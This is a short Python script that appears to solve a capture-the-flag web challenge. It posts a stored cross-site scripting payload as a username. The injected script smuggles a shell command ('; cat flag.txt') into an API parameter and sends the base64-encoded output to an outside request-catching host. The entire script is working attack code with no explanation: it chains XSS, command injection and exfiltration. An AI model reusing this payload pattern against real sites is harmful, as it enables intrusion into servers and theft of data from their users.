import requests
from urllib.parse import quote
#cmd = 'ls'
cmd = 'cat flag.txt'
payload = f'<script>fetch("/api/date?modifier={quote("; " + cmd)}").then(r=>r.text()).then(t=>location.href="https://cyberspace.requestcatcher.com/"+btoa(t))</script>';
print(requests.post('https://not-a-problem.chal.cyberjousting.com/api/stats', json={'username': payload, 'high_score': 0}).text)


